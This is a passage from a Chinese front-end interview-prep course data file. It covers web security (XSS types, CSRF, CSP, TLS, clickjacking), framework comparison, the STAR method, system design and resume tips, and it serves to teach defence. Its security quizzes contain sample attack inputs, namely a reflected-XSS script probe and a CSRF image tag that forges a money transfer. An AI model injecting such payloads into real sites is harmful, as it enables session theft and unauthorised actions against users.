              { title: '步骤 2：服务端未转义输出', description: '服务端将用户输入直接拼接到 HTML 返回给其他用户，未做 HTML 实体转义。这是 XSS 的根因——信任了不可信输入。', highlightLines: [4, 5, 6] },
              { title: '步骤 3：脚本在受害者上下文执行', description: '浏览器将 payload 解析为 <script> 执行。此时脚本运行在受害者登录态的同源上下文中，可读取 cookie、localStorage、发起同源请求，权限等同于受害者。', highlightLines: [7, 8, 9, 10] },
              { title: '步骤 4：防御 - 输出转义', description: '对所有动态输出到 HTML 的内容做实体转义：< → &lt;、> → &gt;、& → &amp;、" → &quot;。React/Vue 默认转义插值，dangerouslySetInnerHTML/v-html 才会绕过。', highlightLines: [12] },
              { title: '步骤 5：防御 - CSP 内容安全策略', description: '响应头 Content-Security-Policy: default-src \'self\'; script-src \'self\'，禁止加载非白名单脚本、禁止内联脚本（除非 nonce/hash）。即使存在 XSS 漏洞，脚本也无法执行。', highlightLines: [13] },
              { title: '步骤 6：防御 - HttpOnly + 输入校验', description: 'Cookie 设 HttpOnly 标志，document.cookie 读不到（防窃取会话）。输入层做白名单校验（如只允许特定标签），纵深防御。', highlightLines: [14, 15] },
            ],
          },
        },
        {
          id: 'iv-p6-5',
          type: 'demo',
          visualizationType: 'interview-quiz-engine',
          data: {
            domain: 'security',
            mode: 'sequential',
            questions: [
              {
                id: 'security-xss-types',
                domain: 'security',
                question: 'XSS 的三种类型？分别如何触发和防御？',
                shortAnswer: '反射型（URL 参数注入，服务端反射）、存储型（存 DB 后输出，危害最大）、DOM 型（前端 JS 拼接 innerHTML）。防御：输出转义 + CSP + HttpOnly。',
                detailedAnswer: 'XSS 三种类型：\n\n1. 反射型 XSS：\n- 触发：URL 参数携带 payload，服务端取出直接拼接到响应 HTML\n- 例：https://site.com/q=<script>alert(1)</script>\n- 特点：需诱导用户点击恶意链接，单次触发\n\n2. 存储型 XSS：\n- 触发：payload 存入数据库，所有访问该数据的用户都被攻击\n- 例：评论区存 <script>，所有浏览评论的用户执行\n- 特点：危害最大，传播范围广\n\n3. DOM 型 XSS：\n- 触发：前端 JS 直接拼接不可信数据到 DOM（innerHTML、document.write、location.href + eval）\n- 特点：不经过服务端，纯前端漏洞\n\n防御（纵深防御）：\n1. 输出转义：HTML 上下文转义 < > & " \'\n2. CSP：禁止内联脚本、限制脚本源\n3. HttpOnly Cookie：防脚本读取会话\n4. 输入校验：白名单过滤（如富文本用 DOMPurify 净化）\n5. 框架默认转义：React/Vue 插值已转义，避免 dangerouslySetInnerHTML/v-html',
                difficulty: 'medium',
                tags: ['XSS', '安全', '面试必考'],
                keyPoints: ['三种类型：反射/存储/DOM', '存储型危害最大', '输出转义是根本', 'CSP/HttpOnly 纵深防御'],
              },
              {
                id: 'security-csrf-flow',
                domain: 'security',
                question: 'CSRF 攻击的完整流程？为何 SameSite Cookie 能防 CSRF？',
                shortAnswer: 'CSRF：用户登录站点 A，访问恶意站点 B，B 自动携带 A 的 Cookie 发起请求。SameSite=Lax/Strict 阻止跨站请求带 Cookie，从源头阻断。',
                detailedAnswer: 'CSRF（Cross-Site Request Forgery）流程：\n1. 用户登录站点 A，浏览器保存 A 的会话 Cookie\n2. 用户未退出 A，访问恶意站点 B\n3. B 页面包含指向 A 的请求（<img src="A/transfer?to=hacker&amount=1000">）\n4. 浏览器自动带上 A 的 Cookie 发起请求\n5. A 服务端校验 Cookie 通过，执行转账\n\n关键：浏览器同源策略不限制 Cookie 携带（Cookie 跨站发送），攻击者利用此机制冒用身份。\n\n防御：\n1. CSRF Token：服务端下发随机 token，前端请求带上，服务端校验\n2. SameSite Cookie：Cookie 设 SameSite=Lax/Strict，跨站请求不带 Cookie\n   - Strict：完全不带（最严，但影响用户体验）\n   - Lax：GET 顶层导航带，其他不带（默认值，平衡安全与体验）\n   - None：跨站带（需 Secure）\n3. Referer/Origin 校验：服务端检查请求来源\n4. 双重 Cookie：Cookie + Header 双重验证\n\nSameSite Cookie 是现代浏览器原生方案，Chrome 80+ 默认 Lax，大幅减少 CSRF。',
                difficulty: 'hard',
                tags: ['CSRF', '安全', 'SameSite'],
                keyPoints: ['CSRF 利用 Cookie 跨站发送', 'CSRF Token 服务端校验', 'SameSite=Lax 默认阻断', 'Referer/Origin 校验'],
              },
              {
                id: 'security-csp-deep',
                domain: 'security',
                question: 'CSP 内容安全策略如何配置？nonce 和 hash 的区别？',
                shortAnswer: 'CSP 通过 Content-Security-Policy 响应头限制资源源。nonce 是一次性随机值，hash 是脚本内容摘要。nonce 适合动态生成的内联脚本，hash 适合静态内联脚本。',
                detailedAnswer: 'CSP（Content Security Policy）配置：\n\n基础指令：\n- default-src \'self\'：默认所有资源只加载同源\n- script-src \'self\'：脚本只加载同源\n- style-src \'self\' \'unsafe-inline\'：样式允许内联\n- img-src \'self\' data:：图片允许同源和 data URL\n- connect-src \'self\' api.example.com：XHR/WebSocket 限制\n- frame-ancestors \'none\'：防点击劫持（等同 X-Frame-Options: DENY）\n\n允许内联脚本（不推荐，必要时用 nonce/hash）：\n1. nonce（推荐）：每次响应生成随机值\n   - 响应头：Content-Security-Policy: script-src \'nonce-abc123\'\n   - 脚本标签：<script nonce="abc123">...</script>\n   - 优势：攻击者无法预测 nonce，注入脚本无法执行\n   - 适合：动态生成的内联脚本（SSR 场景）\n\n2. hash：脚本内容的摘要\n   - 响应头：script-src \'sha256-abc...\'\n   - 适合：静态内联脚本（内容固定不变）\n   - 缺点：脚本内容变化需重新计算 hash\n\n严禁 \'unsafe-inline\'：等同关闭 CSP 对内联脚本的防护。\n严禁 \'unsafe-eval\'：允许 eval/new Function，破坏 CSP 防护。\n\n最佳实践：default-src \'self\'，外部脚本走同源 + nonce，避免内联。',
                difficulty: 'hard',
                tags: ['CSP', '安全', 'HttpOnly'],
                keyPoints: ['default-src 兜底', 'nonce 一次随机值防注入', 'hash 适合静态内联', '严禁 unsafe-inline/eval'],
              },
              {
                id: 'security-https-tls',
                domain: 'security',
                question: 'HTTPS 的握手过程？为何 TLS 1.3 比 1.2 快？',
                shortAnswer: 'TLS 握手：ClientHello→ServerHello+证书+密钥交换→客户端校验证书→生成会话密钥→加密通信。TLS 1.3 把 2-RTT 优化为 1-RTT，支持 0-RTT 恢复。',
                detailedAnswer: 'HTTPS = HTTP + TLS。\n\nTLS 1.2 握手（2-RTT）：\n1. ClientHello：客户端发送支持的 TLS 版本、密码套件、客户端随机数\n2. ServerHello：服务端选定密码套件、服务端随机数\n3. Certificate：服务端发送证书链\n4. ServerKeyExchange：服务端发送 DH 公钥参数\n5. ServerHelloDone：服务端完成\n6. ClientKeyExchange：客户端发送 DH 公钥参数\n7. 双方用两个随机数 + DH 计算会话密钥\n8. ChangeCipherSpec + Finished：切换到加密通信\n\nTLS 1.3 握手（1-RTT）：\n- 合并步骤：ClientHello 直接带 DH 公钥，服务端响应也带 DH 公钥\n- 第一个 RTT 完成密钥协商，第二个 RTT 即可加密通信\n- 支持 0-RTT 恢复：会话恢复时第一个请求即可携带数据\n\nTLS 1.3 优势：\n1. 速度：1-RTT（vs 1.2 的 2-RTT）\n2. 安全：移除弱算法（RSA 密钥交换、SHA-1、MD5、静态 DH）\n3. 隐私：握手大部分加密（ServerHello 之后）\n4. 0-RTT：会话恢复 0 往返（防重放需小心）\n\n证书校验：CA 签名链 → 信任根 → 域名匹配 → 有效期 → 撤销状态（OCSP/CRL）。',
                difficulty: 'hard',
                tags: ['HTTPS', 'TLS', '安全'],
                keyPoints: ['TLS 1.2 是 2-RTT', 'TLS 1.3 优化为 1-RTT', 'DH 密钥交换', '证书链校验'],
              },
              {
                id: 'security-clickjacking',
                domain: 'security',
                question: '点击劫持原理？X-Frame-Options 和 CSP frame-ancestors 的区别？',
                shortAnswer: '点击劫持：透明 iframe 覆盖诱饵按钮，用户以为点击诱饵实则操作 iframe。X-Frame-Options 仅 DENY/SAMEORIGIN 旧标准，CSP frame-ancestors 支持白名单源列表，是现代方案。',
                detailedAnswer: '点击劫持（Clickjacking）原理：\n1. 攻击者页面用 iframe 嵌入受害者站点（已登录态）\n2. iframe 设 opacity:0 完全透明\n3. iframe 上层放诱饵按钮（"领红包"等）\n4. 诱饵按钮与 iframe 内真实按钮位置重合\n5. 用户点击诱饵，实则点击 iframe 内的"删除账号""授权"等按钮\n6. 由于同源 Cookie 自动发送，操作生效\n\n防御方案对比：\n\nX-Frame-Options（旧标准，IE8+）：\n- DENY：禁止任何页面嵌入\n- SAMEORIGIN：仅同源可嵌入\n- ALLOW-FROM uri：指定源（已废弃，Chrome 不支持）\n- 缺点：只能单一控制，不支持白名单多源\n\nCSP frame-ancestors（现代标准）：\n- 语法：Content-Security-Policy: frame-ancestors \'self\' https://trusted.com\n- 支持白名单多源\n- 支持 wildcard、协议、端口\n- 优先级高于 X-Frame-Options（同时存在时 CSP 生效）\n\n其他防御：\n- JS 防御：if (top !== self) top.location = self.location（可被 sandbox 禁用 JS 绕过）\n- 双重 Cookie 校验：操作敏感动作时要求二次确认\n\n推荐：CSP frame-ancestors + 敏感操作二次确认。',
                difficulty: 'medium',
                tags: ['点击劫持', '安全', 'CSP'],
                keyPoints: ['透明 iframe 覆盖诱饵', 'X-Frame-Options 旧标准', 'frame-ancestors 现代方案', '敏感操作二次确认'],
              },
            ],
          },
        },
        {
          id: 'iv-p6-6',
          type: 'callout',
          variant: 'warning',
          title: 'XSS vs CSRF 区别',
          text: 'XSS 是注入恶意脚本在用户浏览器执行（窃取数据/操作页面）；CSRF 是冒用用户身份发请求（以用户权限操作）。XSS 防御重点在输入输出过滤，CSRF 防御重点在请求来源验证。',
        },
      ],
    },

    // ========================================================================
    // 知识点 7：React vs Vue 全面对比
    // ========================================================================
    {
      order: 7,
      title: 'React vs Vue 全面对比',
      difficulty: 2,
      visualizationType: 'comparetable',
      blocks: [
        {
          id: 'iv-p7-1',
          type: 'paragraph',
          lead: true,
          text: 'React 和 Vue 是前端两大主流框架，面试中常要求对比两者的设计理念、响应式机制、组件模式等。',
        },
        {
          id: 'iv-p7-2',
          type: 'demo',
          visualizationType: 'comparetable',
          data: {
            featureColumn: '对比维度',
            columns: ['React', 'Vue'],
            highlightColumn: -1,
            rows: [
              { feature: '设计理念', values: ['函数式、不可变、JSX', '响应式、声明式、模板'] },
              { feature: '响应式机制', values: ['setState 触发重渲染 + Diff', 'Proxy 依赖追踪，精准更新'] },
              { feature: '模板 vs JSX', values: ['JSX（JS 的力量）', '模板（编译时优化）'] },
              { feature: '组件通信', values: ['props/callbacks/Context', 'props/emit/provide-inject'] },
              { feature: '状态管理', values: ['Redux/Zustand（外部库）', 'Vuex/Pinia（官方）'] },
              { feature: 'Diff 策略', values: ['递归同层比较，key 标识', '编译时静态标记 + 运行时 Diff'] },
              { feature: '学习曲线', values: ['较陡（需理解函数式概念）', '较平缓（模板直观）'] },
              { feature: '生态', values: ['社区驱动，选择多样', '官方维护，统一规范'] },
              { feature: '适合场景', values: ['大型应用、团队协作', '中小型应用、快速开发'] },
            ],
          },
        },
      ],
    },

    // ========================================================================
    // 知识点 8：STAR 法则项目复盘
    // ========================================================================
    {
      order: 8,
      title: 'STAR 法则项目复盘',
      difficulty: 2,
      visualizationType: 'accordion',
      blocks: [
        {
          id: 'iv-p8-1',
          type: 'paragraph',
          lead: true,
          text: 'STAR 法则是面试中描述项目经验的结构化方法：Situation（情境）→ Task（任务）→ Action（行动）→ Result（结果）。以下通过折叠面板展示每个环节的要点和示例。',
        },
        {
          id: 'iv-p8-2',
          type: 'demo',
          visualizationType: 'accordion',
          data: {
            defaultOpen: [0],
            items: [
              {
                title: 'S - Situation（情境）：描述项目背景',
                content: '用 1-2 句话交代项目背景，让面试官理解你当时所处的环境。包括项目类型、团队规模、你的角色等。不要过长，重点是让面试官有上下文。',
                code: `❌ "我做了一个电商项目"
✅ "在公司 B2C 电商项目中，我作为前端负责人带领 3 人团队，
   负责商品详情页和购物车流程的重构。原页面首屏加载 3.5 秒，
   转化率仅 2.1%。"`,
                codeLanguage: 'text',
              },
              {
                title: 'T - Task（任务）：明确你的目标',
                content: '说明你面临的具体任务或挑战。要具体、可量化，避免空泛描述。面试官需要知道你需要解决什么问题。',
                code: `❌ "我要优化性能"
✅ "目标是将首屏加载时间从 3.5 秒降至 1.5 秒以内，
   同时将转化率提升至 3% 以上。"`,
                codeLanguage: 'text',
              },
              {
                title: 'A - Action（行动）：详细描述你做了什么',
                content: '这是 STAR 的核心，占 60% 篇幅。要说明你具体做了什么、为什么这么做、遇到什么困难如何解决。突出你的技术决策和思考过程，而非简单罗列技术栈。',
                code: `✅ "1. 分析瓶颈：用 Lighthouse 和 Performance 面板定位到
     图片加载（占 60%）和 JS bundle 过大（2.8MB）
  2. 图片优化：实现懒加载 + WebP 格式 + 响应式图片
  3. 代码分割：React.lazy 按路由拆分 + Tree Shaking
  4. 缓存策略：CDN + Service Worker 缓存静态资源
  5. 遇到问题：懒加载导致 CLS 上升，通过设置图片
     aspect-ratio 解决"`,
                codeLanguage: 'text',
              },
              {
                title: 'R - Result（结果）：用量化数据收尾',
                content: '用具体数据说明成果。数字比形容词更有说服力。如果没有直接数据，可以用间接指标（如用户反馈、代码质量提升等）。',
                code: `✅ "首屏加载从 3.5s 降至 1.2s（提升 66%），
   Lighthouse 性能评分从 45 提升至 92，
   转化率从 2.1% 提升至 3.8%（提升 81%），
   月均增加营收约 120 万元。"`,
                codeLanguage: 'text',
              },
            ],
          },
        },
        {
          id: 'iv-p8-3',
          type: 'callout',
          variant: 'tip',
          title: '为何要按业务场景差异化复盘？',
          text: '不同业务场景面试官关注点不同：ToB 重稳定与定制化、ToC 重性能与转化、基建重抽象与复用。套用通用模板会显得生硬，下方对比表帮助按场景调整 STAR 重点。',
        },
        {
          id: 'iv-p8-4',
          type: 'demo',
          visualizationType: 'comparetable',
          data: {
            featureColumn: 'STAR 环节',
            columns: ['ToB 业务（企业 SaaS/中后台）', 'ToC 业务（电商/社交/内容）', '基建（组件库/工具链/平台）'],
            highlightColumn: 0,
            rows: [
              { feature: 'S 情境重点', values: ['客户定制需求 + 多租户隔离 + 权限体系', '高并发流量 + 用户增长 + 转化漏斗', '团队规模 + 技术栈统一 + 跨业务复用'] },
              { feature: 'T 任务重点', values: ['交付周期紧 + 客户验收标准 + SLA 稳定性', '首屏/转化率指标 + 大促容量 + 体验', 'API 设计 + 覆盖率 + 接入成本降低'] },
              { feature: 'A 行动重点', values: ['配置化/低代码 + 权限模型 + 灰度发布', '懒加载/SSR/CDN + AB 实验 + 监控', '抽离通用逻辑 + 单测 + 文档站 + 发版策略'] },
              { feature: 'R 结果重点', values: ['交付周期 ↓X% + 客户验收通过率 + 故障率', '首屏 ↓Xs + 转化率 ↑X% + 大促 0 故障', '复用业务数 + 接入耗时 ↓X% + Star 数'] },
              { feature: '高频追问', values: ['多租户数据隔离怎么做？权限粒度？', '大促 QPS 多少？怎么压测？降级策略？', '为什么不直接用开源？如何推广接入？'] },
              { feature: '反例（避免）', values: ['只讲业务流程不讲技术决策', '只讲 PV 不讲瓶颈定位过程', '只讲造轮子不讲与开源对比'] },
            ],
          },
        },
        {
          id: 'iv-p8-5',
          type: 'callout',
          variant: 'warning',
          title: '差异化示例：同一"性能优化"主题',
          text: 'ToB："客户加载报表 8s，配置化按需渲染降至 1.5s，客户验收通过率 100%"。ToC："首屏 3.5s→1.2s，转化率 2.1%→3.8%"。基建："组件库按需引入后业务 bundle 平均 ↓40%，接入成本从 2 天→2 小时"。',
        },
      ],
    },

    // ========================================================================
    // 知识点 9：项目难点梳理方法
    // ========================================================================
    {
      order: 9,
      title: '项目难点梳理方法',
      difficulty: 3,
      visualizationType: 'timeline',
      blocks: [
        {
          id: 'iv-p9-1',
          type: 'paragraph',
          lead: true,
          text: '面试官常问「你遇到的最大技术挑战是什么？」。梳理项目难点需要系统化方法，以下是从发现到解决的完整流程。',
        },
        {
          id: 'iv-p9-2',
          type: 'demo',
          visualizationType: 'timeline',
          data: {
            orientation: 'vertical',
            items: [
              { time: '步骤 1', title: '识别难点', description: '从性能瓶颈、技术复杂度、业务复杂度、协作难题四个维度梳理。选择有深度、有量化结果、能体现你能力的难点。', status: 'done' },
              { time: '步骤 2', title: '分析根因', description: '用 5W2H 分析法深挖根因。不要只描述现象，要找到本质问题。例如「页面慢」→「bundle 2.8MB」→「未做代码分割」', status: 'done' },
              { time: '步骤 3', title: '方案设计', description: '提出 2-3 个候选方案，分析各方案优缺点和适用场景，说明为什么选最终方案。体现技术决策能力。', status: 'active' },
              { time: '步骤 4', title: '实施过程', description: '描述实施中的关键步骤、遇到的新问题及解决方式。突出你的问题解决能力和学习能力。', status: 'pending' },
              { time: '步骤 5', title: '量化结果', description: '用具体数据说明成果。技术指标（性能/体积）+ 业务指标（转化率/用户体验）+ 工程指标（可维护性/复用性）。', status: 'pending' },
              { time: '步骤 6', title: '总结反思', description: '说明从中学到了什么、如果重做会怎么改进。展现成长思维和自我反思能力。', status: 'pending' },
            ],
          },
        },
        {
          id: 'iv-p9-3',
          type: 'callout',
          variant: 'tip',
          title: '难点选择原则',
          text: '选择难点的三个原则：1) 真实——编造的难点经不起追问；2) 有深度——能展示技术决策而非简单 API 调用；3) 有结果——能量化成果，证明问题确实被解决了。',
        },
      ],
    },

    // ========================================================================
    // 知识点 10：系统设计（组件库/低代码/微前端）
    // ========================================================================
    {
      order: 10,
      title: '系统设计（组件库 / 低代码 / 微前端）',
      difficulty: 4,
      visualizationType: 'system-design-board',
      blocks: [
        {
          id: 'iv-p10-1',
          type: 'paragraph',
          lead: true,
          text: '高级前端面试常考系统设计题。以下通过系统设计题面板，提供结构化答题模板——需求分析→架构设计→技术选型→关键细节→权衡取舍。',
        },
        {
          id: 'iv-p10-2',
          type: 'demo',
          visualizationType: 'system-design-board',
          data: {
            problems: [
              {
                id: 'error-monitor',
                title: '前端错误监控系统',
                description: '设计一个前端错误监控系统，能够采集 JS 错误、Promise 异常、资源加载失败、接口错误，并支持告警和溯源。',
                steps: [
                  { label: '需求分析', prompt: '需要采集哪些类型的错误？数据量级多大？实时性要求？是否需要 SourceMap 还原？', reference: '错误类型：JS 运行时错误（window.onerror）、Promise 未捕获（unhandledrejection）、资源加载失败（error 事件捕获阶段）、接口错误（fetch/XHR 拦截）、白屏检测。数据量级：百万级 PV，日均千万级错误事件。实时性：错误采集近实时（< 5s），告警延迟 < 1min。SourceMap：生产环境需上传 SourceMap 到监控平台解混淆。' },
                  { label: '架构设计', prompt: '整体架构分几层？数据流向？', reference: '三层架构：1) SDK 层（嵌入业务代码，采集+上报）2) 服务端层（接收+存储+聚合+告警）3) 展示层（Dashboard+告警通知）。数据流：SDK 采集 → 批量上报 → Kafka 消息队列 → Flink 实时聚合 → ES/ClickHouse 存储 → Dashboard 查询展示。' },
                  { label: '技术选型', prompt: 'SDK 如何设计？上报方式？存储方案？', reference: 'SDK：轻量（< 10KB gzip），支持多框架（Vue/React/原生）。上报：navigator.sendBeacon（页面卸载时不丢数据）+ 批量合并（减少请求）。存储：ES（全文搜索+聚合）或 ClickHouse（列存高写入）。告警：钉钉/飞书 Webhook + 邮件。' },
                  { label: '关键细节', prompt: '如何避免 SDK 自身错误影响业务？如何采样？如何防重复上报？', reference: '1) SDK 用 try-catch 包裹所有逻辑，自身错误静默处理；2) 采样率可配置（高流量场景 1%-10%）；3) 错误指纹（message+stack hash）去重，相同错误 5 分钟内只上报一次；4) 离线场景用 IndexedDB 缓存，上线后补报。' },
                  { label: '权衡取舍', prompt: '实时性 vs 成本？全量采样 vs 采样率？自研 vs Sentry？', reference: '1) 实时性 vs 成本：全量实时写入成本高，用采样 + 聚合降低成本；2) 自研 vs Sentry：自研可控性强但维护成本高，中小团队建议先用 Sentry，量大后自研；3) 上报频率：实时上报准确但请求多，批量上报省资源但延迟。折中：错误立即上报，性能数据批量上报。' },
                ],
              },
              {
                id: 'component-lib',
                title: '多团队协作的组件库',
                description: '设计一个支持多团队协作的企业级组件库，要求版本管理、按需加载、主题定制、文档齐全。',
                steps: [
                  { label: '需求分析', prompt: '多少团队使用？组件数量？是否需要支持多框架？主题定制深度？', reference: '5+ 业务团队，50+ 组件，仅 React。主题定制需支持 CSS Variables 运行时切换 + Sass 变量编译时定制。需要支持暗色模式。版本管理：语义化版本 + 变更日志 + 迁移指南。' },
                  { label: '架构设计', prompt: 'Monorepo 还是多仓库？如何组织组件？', reference: 'Monorepo（pnpm workspace）：packages/components/* 每个组件独立包，packages/core 共享工具，packages/themes 主题，packages/docs 文档站点。发布：每个组件独立版本，支持按需安装。CI：Changesets 管理版本和变更日志。' },
                  { label: '技术选型', prompt: '构建工具？样式方案？文档工具？测试方案？', reference: '构建：tsup（基于 esbuild，ESM+CJS+类型）。样式：CSS Modules + CSS Variables（运行时主题）+ Sass（编译时变量）。文档：Storybook + MDX。测试：Vitest（单元）+ Testing Library（组件）+ Playwright（E2E）。' },
                  { label: '关键细节', prompt: '如何实现按需加载？主题如何切换？如何保证 API 一致性？', reference: '按需加载：ESM 子路径导入（import Button from "@lib/button"）。主题：CSS Variables 定义在 :root，主题切换改 :root 变量值。API 一致性：ESLint 自定义规则检查 props 命名规范 + TypeScript 类型约束 + 组件 API 审查流程。' },
                  { label: '权衡取舍', prompt: '独立包 vs 整包？CSS-in-JS vs CSS Modules？', reference: '1) 独立包：安装灵活但版本管理复杂；整包：简单但体积大。折中：核心组件独立包，工具组件整包；2) CSS-in-JS 运行时开销大但动态性强，CSS Modules 零运行时但主题切换需 CSS Variables。选 CSS Modules + CSS Variables 平衡性能和灵活性。' },
                ],
              },
              {
                id: 'micro-frontend',
                title: '微前端架构设计',
                description: '设计一个支持多团队独立开发部署的微前端架构，要求子应用隔离、路由分发、共享依赖。',
                steps: [
                  { label: '需求分析', prompt: '多少子应用？技术栈是否统一？是否需要独立部署？共享哪些依赖？', reference: '5 个子应用，技术栈不统一（React/Vue/旧 jQuery）。每个子应用独立仓库、独立部署、独立 CI/CD。共享依赖：React/Vue 运行时、UI 组件库、工具函数。路由：主应用控制一级路由，子应用控制二级路由。' },
                  { label: '架构设计', prompt: '基座+子应用如何组织？通信机制？路由分发？', reference: '基座应用（Container）：负责加载子应用、路由分发、全局状态。子应用：独立开发，暴露 mount/unmount 生命周期。通信：Custom Events（松耦合）+ 共享 Store（Zustand/Redux）。路由：基座监听 URL 变化，动态加载对应子应用。' },
                  { label: '技术选型', prompt: 'qiankun vs Module Federation vs 自研？', reference: 'qiankun：成熟、基于 single-spa、JS 沙箱（Proxy）、CSS 隔离（Shadow DOM/Scoped）。Module Federation：Webpack 5 原生、运行时模块共享、但绑定 Webpack。自研：完全可控但成本高。选 qiankun（生态成熟，沙箱隔离好）。' },
                  { label: '关键细节', prompt: 'JS 沙箱如何实现？CSS 隔离？子应用间通信？公共依赖提取？', reference: 'JS 沙箱：Proxy 代理 window，子应用对 window 的修改在卸载时恢复。CSS 隔离：Shadow DOM（最强隔离但样式穿透难）或 CSS Scoped（加前缀，兼容性好）。通信：全局 CustomEvent + 数据 payload。公共依赖：externals + CDN 加载，子应用配置 externals 不打包。' },
                  { label: '权衡取舍', prompt: '沙箱强度 vs 兼容性？独立部署 vs 统一构建？', reference: '1) Shadow DOM 隔离最强但第三方库（如 antd Modal 挂载 body）会失效，Scoped CSS 兼容性好但可能冲突。折中：默认 Scoped，关键场景 Shadow DOM；2) 独立部署灵活但启动慢（多个 bundle），统一构建快但耦合高。微前端选独立部署。' },
                ],
              },
            ],
          },
        },
      ],
    },

    // ========================================================================
    // 知识点 11：系统设计方法论
    // ========================================================================
    {
      order: 11,
      title: '系统设计方法论',
      difficulty: 3,
      visualizationType: 'architecture',
      blocks: [
        {
          id: 'iv-p11-1',
          type: 'paragraph',
          lead: true,
          text: '系统设计题没有标准答案，但有方法论。以下是从需求理解到方案落地的系统化设计流程。',
        },
        {
          id: 'iv-p11-2',
          type: 'demo',
          visualizationType: 'architecture',
          data: {
            title: '前端系统设计方法论',
            flowDirection: 'top-down',
            layers: [
              {
                name: '1. 需求理解（5 分钟）',
                description: '明确功能需求和非功能需求，确定范围',
                components: [
                  { name: '功能需求', description: '系统要做什么？核心功能有哪些？' },
                  { name: '非功能需求', description: '性能/可用性/扩展性/安全性要求？' },
                  { name: '规模估算', description: 'QPS/数据量/用户量？' },
                ],
              },
              {
                name: '2. 架构设计（10 分钟）',
                description: '从高层到低层分层设计',
                components: [
                  { name: '整体架构', description: '前端/后端/数据库/缓存/CDN 分层' },
                  { name: '数据流', description: '用户请求→前端→API→数据→返回的完整链路' },
                  { name: '组件划分', description: '模块化拆分，明确职责边界' },
                ],
              },
              {
                name: '3. 技术选型（5 分钟）',
                description: '为每个层级选择合适的技术方案',
                components: [
                  { name: '框架选择', description: 'React/Vue/Next.js/Nuxt.js 及理由' },
                  { name: '状态管理', description: 'Redux/Zustand/Pinia/Context' },
                  { name: '构建工具', description: 'Vite/Webpack/Rollup' },
                ],
              },
              {
                name: '4. 关键细节（5 分钟）',
                description: '深入关键组件的实现细节',
                components: [
                  { name: '性能优化', description: '懒加载/缓存/CDN/SSR/代码分割' },
                  { name: '错误处理', description: '错误边界/监控/降级方案' },
                  { name: '安全策略', description: 'XSS/CSRF/CSP/HTTPS' },
                ],
              },
              {
                name: '5. 权衡取舍（5 分钟）',
                description: '主动讨论方案的优缺点和替代方案',
                components: [
                  { name: 'SSR vs CSR', description: 'SEO/首屏 vs 开发复杂度' },
                  { name: '自研 vs 开源', description: '可控性 vs 维护成本' },
                  { name: '扩展性 vs 简洁性', description: '未来扩展 vs 当前简洁' },
                ],
              },
            ],
          },
        },
      ],
    },

    // ========================================================================
    // 知识点 12：简历撰写技巧
    // ========================================================================
    {
      order: 12,
      title: '简历撰写技巧',
      difficulty: 1,
      visualizationType: 'accordion',
      blocks: [
        {
          id: 'iv-p12-1',
          type: 'paragraph',
          lead: true,
          text: '简历是面试的敲门砖。好的简历能在 15 秒内让面试官看到你的价值。以下通过折叠面板展示简历撰写的核心技巧。',
        },
        {
          id: 'iv-p12-2',
          type: 'demo',
          visualizationType: 'accordion',
          data: {
            defaultOpen: [0],
            items: [
              {
                title: 'STAR 法则写项目经验',
                content: '每个项目用 STAR 法则描述：Situation（背景）+ Task（任务）+ Action（行动）+ Result（结果）。重点在 Action 和 Result，Result 必须量化。',
                code: `❌ "负责前端开发，使用 React"
✅ "主导电商首页重构（S），目标首屏从 3.5s 降至 1.5s（T），
   实施 图片懒加载+代码分割+CDN 缓存（A），
   首屏降至 1.2s，转化率提升 81%（R）"`,
                codeLanguage: 'text',
              },
              {
                title: '量化你的成果',
                content: '用数字说话。性能提升用百分比/绝对值，业务影响用转化率/营收/用户量，工程质量用测试覆盖率/包体积/构建时间。',
                code: `✅ "首屏加载从 3.5s 降至 1.2s（-66%）"
✅ "Lighthouse 评分 45 → 92"
✅ "构建时间从 120s 降至 30s（-75%）"
✅ "测试覆盖率从 0% 提升至 85%"
✅ "月均服务 500 万 PV，错误率 < 0.01%"`,
                codeLanguage: 'text',
              },
              {
                title: '技术栈描述策略',
                content: '不要罗列所有用过的技术，只写与目标岗位相关的。区分「精通」「熟练」「了解」，面试官会按你写的最深的技术提问。',
                code: `✅ 精通：JavaScript/TypeScript/React
   熟练：Vue/Next.js/Node.js/Webpack
   了解：Rust/Go/Docker

❌ React, Vue, Angular, jQuery, Backbone,
   Three.js, D3.js, Canvas, WebGL...（太多了）`,
                codeLanguage: 'text',
              },
              {
                title: '避免常见错误',
                content: '1) 不要用 Word 格式（用 PDF）；2) 不要放照片（除非外企）；3) 不要超过 2 页；4) 不要有错别字；5) 不要虚夸（面试会追问）；6) 不要写废弃的项目。',
                code: '',
                codeLanguage: 'text',
              },
            ],
          },
        },
      ],
    },

    // ========================================================================
    // 知识点 13：面试流程与技巧
    // ========================================================================
    {
      order: 13,
      title: '面试流程与技巧',
      difficulty: 1,
      visualizationType: 'timeline',
      blocks: [
        {
          id: 'iv-p13-1',
          type: 'paragraph',
          lead: true,
          text: '了解面试的标准流程和每个环节的技巧，能帮助你在面试中更有条理地展示自己。',
        },
        {
          id: 'iv-p13-2',
          type: 'demo',
          visualizationType: 'timeline',
          data: {
            orientation: 'vertical',
            items: [
              { time: '环节 1', title: '自我介绍（1-2 分钟）', description: '简洁有力：姓名+经验年限+核心技能+最亮眼的项目。不要背简历，用故事吸引面试官。', status: 'done' },
              { time: '环节 2', title: '技术问答（30-40 分钟）', description: '八股+项目深挖+手写代码。答题四步法：先结论后分析→举例→对比→延伸。不会的诚实说不知道。', status: 'done' },
              { time: '环节 3', title: '项目深挖（15-20 分钟）', description: 'STAR 法则描述项目。准备好 2-3 个有深度的项目难点。面试官会追问细节，确保你真的做过。', status: 'active' },
              { time: '环节 4', title: '手写代码（15-30 分钟）', description: '防抖节流/深拷贝/Promise/数组扁平化等高频题。先确认需求→说思路→写代码→测试边界。', status: 'pending' },
              { time: '环节 5', title: '反问环节（5-10 分钟）', description: '问团队规模/技术栈/业务方向/个人成长。不要问薪资福利（留给 HR 面）。展示你对岗位的兴趣。', status: 'pending' },
            ],
          },
        },
        {
          id: 'iv-p13-3',
          type: 'callout',
          variant: 'tip',
          title: '答题四步法',
          text: '面试答题四步法：1) 先说结论让面试官知道你懂；2) 展开分析展示深度；3) 用举例佐证理解；4) 延伸对比展现广度。切忌一上来就长篇大论。',
        },
      ],
    },

    // ========================================================================
    // 知识点 14：职业发展路径
    // ========================================================================
    {
      order: 14,
      title: '职业发展路径',
      difficulty: 1,
      visualizationType: 'timeline',
      blocks: [
        {
          id: 'iv-p14-1',
          type: 'paragraph',
          lead: true,
          text: '前端工程师的职业发展有多条路径。了解各阶段的能力要求和发展方向，有助于规划职业生涯。',
        },
        {
          id: 'iv-p14-2',
          type: 'demo',
          visualizationType: 'timeline',
          data: {
